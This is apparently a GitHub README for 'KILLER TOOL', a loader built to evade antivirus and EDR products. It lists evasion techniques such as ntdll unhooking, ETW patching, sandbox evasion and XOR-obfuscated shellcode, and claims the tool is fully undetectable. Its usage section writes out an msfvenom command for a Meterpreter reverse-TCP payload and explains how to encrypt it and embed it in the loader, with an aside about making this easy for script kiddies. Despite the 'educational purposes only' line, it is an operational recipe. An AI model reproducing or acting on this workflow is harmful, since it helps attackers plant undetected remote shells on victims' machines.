# KILLER TOOL (EDR Evasion)
It's a AV/EDR Evasion tool created to bypass security tools for learning, until now the tool is FUD.

# Features:

* Module Stomping for Memory scanning evasion
* DLL Unhooking by fresh ntdll copy
* IAT Hiding and Obfuscation & API Unhooking
* ETW Patchnig for bypassing some security controls
* Included sandbox evasion techniques & Basic Anti-Debugging
* Fully obfuscated (Functions - Keys - Shellcode) by XOR-ing
* Shellcode reversed and Encrypted
* Moving payload into hallowed memory without using APIs 
* Runs without creating new thread & Suppoers x64 and x86 arch

# How to use it

Generate your shellcode with msfvenom tool :

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<IP> LPORT<PORT> -f raw -o haxxor.bin
      
 Then use the file as an argument to the encryptor XOR function script:
 
`python3 shellcode-xor.py haxxor.bin`

And then you can handle your decryption function, *I've made it easier for script kiddies XD*, paste the output of the previous command into the killer.cpp code as the value of the shellcode unsigned char array.

This is the result when running :

![image](https://user-images.githubusercontent.com/82971998/230731975-a70abd1c-279b-4e79-9e91-6b5212b7db9a.png)

# PoC (Proof-of-Concept) :

https://antiscan.me/images/result/07OkIKKhpRsG.png

![image](https://user-images.githubusercontent.com/82971998/230732045-ca2638fe-4f3c-4926-8f94-4fff817ca585.png)

# Important Notes

* First thanks to Abdallah Mohammed for helping me to develop it ^_^
* The tool is for educational purposes only
* Compile the code with visual studio compiler

